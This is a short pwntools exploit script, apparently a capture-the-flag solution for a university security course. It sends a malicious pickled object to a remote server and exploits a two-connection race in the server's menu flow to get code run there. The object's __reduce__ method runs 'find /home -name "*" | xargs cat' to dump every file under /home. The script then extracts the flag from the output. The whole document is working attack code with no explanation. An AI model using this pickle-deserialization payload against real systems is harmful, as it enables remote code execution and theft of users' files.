from pwn import *
import time
import os
import pickle
import re
from multiprocessing import Process

class RCE:
    def __reduce__(self):
        return (os.system, ("find /home -name \"*\" | xargs cat",))

def read():
    s = remote(SERVER, PORT, timeout=9999)
    time.sleep(1)
    s.recv(10240).decode()
    s.sendline(b'goncalo')
    time.sleep(1)
    s.recv(10240).decode()
    s.sendline(b'0')
    time.sleep(1)
    s.recv(10240).decode()
    time.sleep(4)
    s.sendline(b'0')
    time.sleep(1)
    s.recv(10240).decode()
    s.sendline(b'rce')
    time.sleep(1)
    response = s.recv(10240).decode()
    if "SSof{" in response:
        print(re.search('SSof{.*}', response).group(0))

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22653

p = Process(target = read)
p.start()

s = remote(SERVER, PORT, timeout=9999)
time.sleep(1)
s.recv(10240).decode()
s.sendline(b'goncalo')
time.sleep(1)
s.recv(10240).decode()
s.sendline(b'1')
time.sleep(1)
s.recv(10240).decode()
time.sleep(2)
s.sendline(b'1')
time.sleep(1)
s.recv(10240).decode()
s.sendline(b'rce')
time.sleep(1)
s.recv(10240).decode()
s.sendline(pickle.dumps(RCE()))
s.sendline(b'\n')